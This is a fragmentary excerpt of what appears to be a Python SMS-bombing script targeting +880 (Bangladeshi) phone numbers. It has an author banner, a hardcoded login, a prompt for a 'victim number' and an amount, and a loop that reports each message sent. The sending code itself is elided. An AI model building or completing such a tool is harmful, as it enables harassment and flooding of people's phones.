...
\033[1;32m[-] AUTHOR    :\033[1;32m Tanjid Ahmed 
\033[1;32m[-] GITHUB    :\033[1;32m Tanjid-143
...
if 'Tanjid'==user and 'tanjid'==pas:
	...
	os.system('xdg-open https://www.facebook.com/tanjid.technology?mibextid=ZbWKwL')
else:
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH Tanjid ;) {w}<{r}/{w}>\n\n")
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥Tanjid🔥 "+w+tim)
